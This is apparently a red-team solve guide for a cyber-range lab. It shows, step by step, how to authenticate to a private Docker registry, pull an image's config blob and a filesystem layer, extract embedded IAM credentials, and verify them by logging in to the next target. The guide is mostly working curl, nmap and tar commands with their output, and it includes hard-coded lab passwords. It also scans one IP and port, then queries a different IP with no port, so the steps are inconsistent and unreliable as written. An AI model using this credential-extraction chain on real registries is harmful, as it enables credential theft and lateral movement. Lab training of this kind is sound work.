# Solve Guide — Red Team
## RNG-CLD-01 | M4 — cld-registry | Container Image Inspection → Credential Extraction
**Technique:** T1552.001 — Credentials in Files (Container Image Layer/Config)  
**Pivot In:** registry-admin:Reg!stry@CLD2024 @ 193.0.0.50 (from M3 K8s secret)

## Objective
Authenticate to the private container registry, enumerate available images, pull the `pul-cloud/platform-svc:latest` image, and extract IAM credentials embedded in the image's environment variable configuration.

## Step 1 — Discover Registry

```bash
nmap -sV -p 5000 11.0.2.40
# 5000/tcp  open  Docker Registry v2 API

# Verify via API
curl -s http://193.0.0.50/v2/
# {}  (200 OK = registry is up, auth required for catalog)
```

## Step 2 — Authenticate and Enumerate Images

```bash
# List all repositories (requires valid credentials)
curl -s -u "registry-admin:Reg!stry@CLD2024" \
    http://193.0.0.50/v2/_catalog
# {"repositories":["pul-cloud/platform-svc"]}

# List tags for the image
curl -s -u "registry-admin:Reg!stry@CLD2024" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/tags/list
# {"name":"pul-cloud/platform-svc","tags":["latest","2.4.0","2.4.1"]}
```

## Step 3 — Fetch Image Manifest

```bash
curl -s -u "registry-admin:Reg!stry@CLD2024" \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/manifests/latest
```

The manifest contains a `config` section with a `digest` value (sha256 hash):
```json
{
  "config": {
    "mediaType": "application/vnd.docker.container.image.v1+json",
    "size": 1234,
    "digest": "sha256:<CONFIG_DIGEST>"
  },
  "layers": [...]
}
```

Save the `config.digest` value — this is the image config blob.

## Step 4 — Pull the Image Config Blob (THE GOAL)

The image config blob contains all ENV values set during the Docker build:

```bash
# Extract config digest from manifest
CONFIG_DIGEST=$(curl -s -u "registry-admin:Reg!stry@CLD2024" \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/manifests/latest \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['config']['digest'])")

echo "Config digest: ${CONFIG_DIGEST}"

# Download and read the config blob
curl -s -u "registry-admin:Reg!stry@CLD2024" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/blobs/${CONFIG_DIGEST} \
    | python3 -c "
import sys, json
cfg = json.load(sys.stdin)
print('=== Image ENV Variables ===')
for e in cfg.get('config', {}).get('Env', []):
    print(e)
"
```

Output:
```
=== Image ENV Variables ===
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CLOUD_IAM_URL=http://193.0.2.136:8080
CLOUD_IAM_USER=cloud-iam-svc
CLOUD_IAM_PASS=IAm@CLD!2025
APP_ENV=production
PORT=8080
```

## Step 5 — Alternative: Pull Layer and Extract .env File

If the container image also bakes the credentials into a filesystem layer:

```bash
# Get layer digests from manifest
LAYER_DIGEST=$(curl -s -u "registry-admin:Reg!stry@CLD2024" \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/manifests/latest \
    | python3 -c "import sys,json; m=json.load(sys.stdin); print(m['layers'][-1]['digest'])")

# Download the layer (gzip tar)
curl -s -u "registry-admin:Reg!stry@CLD2024" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/blobs/${LAYER_DIGEST} \
    | tar -tz | grep ".env"
# opt/app/config/.env

# Extract it
curl -s -u "registry-admin:Reg!stry@CLD2024" \
    http://193.0.0.50/v2/pul-cloud/platform-svc/blobs/${LAYER_DIGEST} \
    | tar -Oz opt/app/config/.env
# CLOUD_IAM_URL=http://193.0.2.136:8080
# CLOUD_IAM_USER=cloud-iam-svc
# CLOUD_IAM_PASS=IAm@CLD!2025
```

## Step 6 — Verify Credentials Against M5

```bash
curl -s -X POST http://193.0.2.136:8080/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"cloud-iam-svc","password":"IAm@CLD!2025"}' \
    | python3 -m json.tool
# {"token": "<jwt>", "role": "iam_user", "message": "Login successful"}
```

Pivot to M5 confirmed.

## Summary

| Item | Value |
|---|---|
| Vulnerability | Credentials baked into container image ENV + layer filesystem |
| Stolen Credentials | CLOUD_IAM_USER=cloud-iam-svc / CLOUD_IAM_PASS=IAm@CLD!2025 |
| Method | Registry v2 API — manifest → config blob → ENV inspection |
| Next Target | M5 PUL Cloud IAM Console (193.0.2.136:8080) |
| MITRE | T1552.001 |
